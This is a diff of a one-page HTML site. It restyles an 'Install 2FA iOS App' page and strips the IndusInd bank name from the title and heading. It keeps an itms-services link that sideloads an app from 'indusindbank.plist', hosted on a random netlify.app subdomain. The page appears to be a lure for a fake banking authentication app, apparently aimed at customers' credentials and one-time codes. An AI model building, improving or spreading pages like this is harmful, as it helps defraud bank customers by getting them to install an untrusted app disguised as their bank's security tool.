@@ -1,19 +1,79 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Install IndusInd 2FA IOS</title>
-    <style>
-        body { font-family: Arial, text-align: center; padding: 20px; }
-        .install-btn {
-            background: #007AFF; color: white; padding: 12px 24px;
-            border-radius: 6px; text-decoration: none; display: inline-block;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Install 2FA iOS App</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: linear-gradient(135deg, #2e3192, #1bffff);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 40px 30px;
+      border-radius: 20px;
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+    }
+
+    h1 {
+      font-size: 1.8em;
+      margin-bottom: 20px;
+    }
+
+    p {
+      font-size: 1rem;
+      margin-bottom: 30px;
+      line-height: 1.6;
+    }
+
+    .btn {
+      display: inline-block;
+      padding: 14px 28px;
+      background: #00e6e6;
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      text-decoration: none;
+      font-size: 1rem;
+      transition: background 0.3s ease;
+    }
+
+    .btn:hover {
+      background: #00cccc;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 30px 20px;
+      }
+      h1 {
+        font-size: 1.5em;
+      }
+    }
+  </style>
 </head>
 <body>
-    <h1>IndusInd 2FA App IOS (URL to be used on safari browser iphone) </h1>
+  <div class="card">
+    <h1>Install 2FA iOS App</h1>
+    <p>
+      This app is for iPhone or iPad only.<br>
+      Please open this page in the <strong>Safari browser</strong> to install the 2FA app.
+    </p>
     <a href="itms-services://?action=download-manifest&url=https://cerulean-gumdrop-2c6a8c.netlify.app/indusindbank.plist" class="install-btn">
-        Install App
+      Install iOS App
     </a>
+  </div>
 </body>
 </html>
